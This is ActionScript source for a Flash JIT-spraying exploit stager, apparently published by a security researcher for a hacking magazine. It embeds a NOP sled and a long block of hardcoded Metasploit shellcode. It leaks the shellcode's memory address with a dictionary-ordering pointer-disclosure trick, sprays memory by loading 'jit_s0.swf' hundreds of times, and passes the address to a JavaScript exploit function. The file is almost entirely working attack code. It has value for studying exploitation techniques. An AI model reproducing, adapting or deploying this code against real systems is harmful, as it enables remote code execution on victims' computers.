
/*
FrommETaSploit2JIT v 0.9b
by Alexey Sintsov [DSecRG]
http://dsecrg.com

Special release for XAKEP magazine (http://www.xakep.ru)
*/

// Sprayng JIT.swf
// 
// Spraing JIT stage-0 shellcode
//
// Calc pointer on string shellcode from MetaSploit
// return pointer to JavaScript sploit.
//
//  By Alexey Sintsov
//	dookie.ru
//	a.sintsov.ru
//
//	DSecRG - Digital Security Research Group [dsecrg.com]
//
package
{
    
	import flash.display.*;
	import flash.net.*;
    import flash.text.TextField;
    import flash.text.TextFieldType;
	import flash.system.Security;
	import flash.external.ExternalInterface;
	import flash.utils.*;
	
    public class Loadzz1 extends MovieClip
    {
	
		var MyTextField1:TextField = createTextField(10, 40, 300, 20);
		var MyTextField2:TextField = createTextField(10, 80, 300, 20);
		var childRef:DisplayObject = null;
	
		var shellcode:String = new String();
	
		var addr1=0;
		var ic=0;
		var ldInt;
		
		private function createTextField(x:Number, y:Number, width:Number, height:Number):TextField {
            var result:TextField = new TextField();
            result.x = x;
            result.y = y;
            result.width = width;
            result.height = height;
            result.background = true;
            result.border = true;
            addChild(result);
            return result;
        }

	
		function pageLoadEx()
		{
						
		    var ldr = new Loader();
			var url = "jit_s0.swf";
			var urlReq = new URLRequest(url);
            ldr.load(urlReq);
			childRef = addChild(ldr); 
            
			
		}
		function pageLoad()
		{
		    
			for(var z=0;z<600;z++){pageLoadEx();}
			ic=ic+1;
			MyTextField1.text=ic+" - JIT spraying, wait for 4 ...";
			if(ic==4)
				{
					clearInterval(ldInt);
					MyTextField1.text=ic+" - done, calling sploit...";
					ExternalInterface.call("exploit", addr1);
				}
		}
		function metaShell() {
		
			
		
			for (var i = 0; i< 100; i++)
			{
				shellcode=shellcode+'\u9090';
			}
			
			//shellcode from MetaSploit
			shellcode=shellcode+'\uc3dd';
shellcode=shellcode+'\u4fba';
shellcode=shellcode+'\ubc95';
shellcode=shellcode+'\u2994';
shellcode=shellcode+'\ud9c9';
shellcode=shellcode+'\u2474';
shellcode=shellcode+'\u5df4';
shellcode=shellcode+'\u4fb1';
shellcode=shellcode+'\u5531';
shellcode=shellcode+'\u0319';
shellcode=shellcode+'\u1955';
shellcode=shellcode+'\ued83';
shellcode=shellcode+'\uadfc';
shellcode=shellcode+'\u4060';
shellcode=shellcode+'\ub87c';
shellcode=shellcode+'\ub98b';
shellcode=shellcode+'\uda7d';
shellcode=shellcode+'\u5c02';
shellcode=shellcode+'\uc84c';
shellcode=shellcode+'\u1471';
shellcode=shellcode+'\udcfd';
shellcode=shellcode+'\u78f2';
shellcode=shellcode+'\u970e';
shellcode=shellcode+'\u6957';
shellcode=shellcode+'\ud585';
shellcode=shellcode+'\u9e7f';
shellcode=shellcode+'\u532e';
shellcode=shellcode+'\u91a6';
shellcode=shellcode+'\u52af';
shellcode=shellcode+'\u7d66';
shellcode=shellcode+'\uf573';
shellcode=shellcode+'\u7c1a';
shellcode=shellcode+'\ud5a0';
shellcode=shellcode+'\u4f23';
shellcode=shellcode+'\u14b5';
shellcode=shellcode+'\ub263';
shellcode=shellcode+'\u4436';
shellcode=shellcode+'\ub83c';
shellcode=shellcode+'\u78e5';
shellcode=shellcode+'\ufc49';
shellcode=shellcode+'\u7935';
shellcode=shellcode+'\u8a9d';
shellcode=shellcode+'\u0106';
shellcode=shellcode+'\u4d98';
shellcode=shellcode+'\ubbf2';
shellcode=shellcode+'\u9da3';
shellcode=shellcode+'\ub0ab';
shellcode=shellcode+'\u05ec';
shellcode=shellcode+'\u9ec7';
shellcode=shellcode+'\u34cc';
shellcode=shellcode+'\ufd04';
shellcode=shellcode+'\u7e31';
shellcode=shellcode+'\u3521';
shellcode=shellcode+'\u81c1';
shellcode=shellcode+'\u04e3';
shellcode=shellcode+'\ub02a';
shellcode=shellcode+'\ucacb';
shellcode=shellcode+'\u7c15';
shellcode=shellcode+'\u13c6';
shellcode=shellcode+'\ubb51';
shellcode=shellcode+'\u6639';
shellcode=shellcode+'\ubfa9';
shellcode=shellcode+'\u70c4';
shellcode=shellcode+'\ubd6a';
shellcode=shellcode+'\uf512';
shellcode=shellcode+'\u656f';
shellcode=shellcode+'\uadd0';
shellcode=shellcode+'\u974b';
shellcode=shellcode+'\u2b35';
shellcode=shellcode+'\u9b1f';
shellcode=shellcode+'\u38f2';
shellcode=shellcode+'\ub847';
shellcode=shellcode+'\ued05';
shellcode=shellcode+'\uc4f3';
shellcode=shellcode+'\u108e';
shellcode=shellcode+'\u4cd4';
shellcode=shellcode+'\u36d4';
shellcode=shellcode+'\u15f0';
shellcode=shellcode+'\u578e';
shellcode=shellcode+'\uf3a1';
shellcode=shellcode+'\u6861';
shellcode=shellcode+'\u5cb1';
shellcode=shellcode+'\uccdd';
shellcode=shellcode+'\u4fb9';
shellcode=shellcode+'\u760a';
shellcode=shellcode+'\u07e0';
shellcode=shellcode+'\u44ff';
shellcode=shellcode+'\ud81b';
shellcode=shellcode+'\udf97';
shellcode=shellcode+'\uea68';
shellcode=shellcode+'\u4b38';
shellcode=shellcode+'\u46e7';
shellcode=shellcode+'\u55b0';
shellcode=shellcode+'\ua9f0';
shellcode=shellcode+'\u21eb';
shellcode=shellcode+'\u546e';
shellcode=shellcode+'\u5114';
shellcode=shellcode+'\u93a6';
shellcode=shellcode+'\u0140';
shellcode=shellcode+'\u32d0';
shellcode=shellcode+'\ucae9';
shellcode=shellcode+'\uba20';
shellcode=shellcode+'\u5c3c';
shellcode=shellcode+'\u1471';
shellcode=shellcode+'\u1cef';
shellcode=shellcode+'\ud421';
shellcode=shellcode+'\uf45f';
shellcode=shellcode+'\udb2b';
shellcode=shellcode+'\ue480';
shellcode=shellcode+'\u3153';
shellcode=shellcode+'\u23b7';
shellcode=shellcode+'\uc5c3';
shellcode=shellcode+'\uabc8';
shellcode=shellcode+'\u5215';
shellcode=shellcode+'\uabcb';
shellcode=shellcode+'\ufe04';
shellcode=shellcode+'\u4d42';
shellcode=shellcode+'\uee4c';
shellcode=shellcode+'\uc602';
shellcode=shellcode+'\u97f9';
shellcode=shellcode+'\u9c0e';
shellcode=shellcode+'\u5898';
shellcode=shellcode+'\u3485';
shellcode=shellcode+'\uca38';
shellcode=shellcode+'\uc442';
shellcode=shellcode+'\uf737';
shellcode=shellcode+'\u93dc';
shellcode=shellcode+'\uc910';
shellcode=shellcode+'\u7114';
shellcode=shellcode+'\u708d';
shellcode=shellcode+'\u678f';
shellcode=shellcode+'\ue44c';
shellcode=shellcode+'\u23e8';
shellcode=shellcode+'\ud58b';
shellcode=shellcode+'\uaaf7';
shellcode=shellcode+'\u615e';
shellcode=shellcode+'\ubcdc';
shellcode=shellcode+'\u6aa6';
shellcode=shellcode+'\ue858';
shellcode=shellcode+'\u3d76';
shellcode=shellcode+'\u4636';
shellcode=shellcode+'\u9731';
shellcode=shellcode+'\u30f8';
shellcode=shellcode+'\u44eb';
shellcode=shellcode+'\ud453';
shellcode=shellcode+'\ua76a';
shellcode=shellcode+'\ua264';
shellcode=shellcode+'\ue272';
shellcode=shellcode+'\u4a12';
shellcode=shellcode+'\u5bc2';
shellcode=shellcode+'\u7563';
shellcode=shellcode+'\u0beb';
shellcode=shellcode+'\u0e63';
shellcode=shellcode+'\uac11';
shellcode=shellcode+'\uc58c';
shellcode=shellcode+'\udc91';
shellcode=shellcode+'\u47c6';
shellcode=shellcode+'\u74b3';
shellcode=shellcode+'\u128f';
shellcode=shellcode+'\u1881';
shellcode=shellcode+'\uc930';
shellcode=shellcode+'\u24c6';
shellcode=shellcode+'\ufbb3';
shellcode=shellcode+'\ud2b6';
shellcode=shellcode+'\u8eab';
shellcode=shellcode+'\u9fb3';
shellcode=shellcode+'\u636b';
shellcode=shellcode+'\ub0ce';
shellcode=shellcode+'\u8319';
shellcode=shellcode+'\ub07d';
shellcode=shellcode+'\u000b';

			}
 
			//for slow CPU need to make timeout or within 15 sec will kill it
			//Function's code by Dion Blazakis 
			function objToPtr(obj) {
			var i;
			var even = new Dictionary();
			var odd = new Dictionary();
 
		
			for (i = 0; i < (1024 * 1024 * 8); i += 1) {
				even[i * 2] = i;
				odd[i * 2 + 1] = i;
			}
 
 
			even[obj] = false;
			odd[obj] = false;
 
			var evenPrev = 0;
			var oddPrev = 0;
			var curr;
 
			for (curr in even)
			{
				if (curr == obj) { break; }
				evenPrev = curr;
			}
 
  
			for (curr in odd)
			{
					if (curr == obj) { break; }
					oddPrev = curr;
			}
 
			var ptr;
			if (evenPrev < oddPrev) {
			ptr = evenPrev;
			if (evenPrev + 8 + 9 != oddPrev) {
				return 0;
			}
			} else {
			ptr = oddPrev;
				if (oddPrev + 8 + 9 != evenPrev) {
					return 0;
				}
			}
			ptr = (ptr + 1) * 8;
 
			return ptr;
		}
	
		function Loadzz1()
		{
		    
            Security.allowDomain("*");
			MyTextField1.type = TextFieldType.DYNAMIC;
			
			
			metaShell();
			addr1=objToPtr(shellcode);
			addr1=addr1+0xC;
			MyTextField2.text=addr1+" - shellcode addrz (dec)";
			ldInt=setInterval(pageLoad,3500);
			    
		}
    }
}
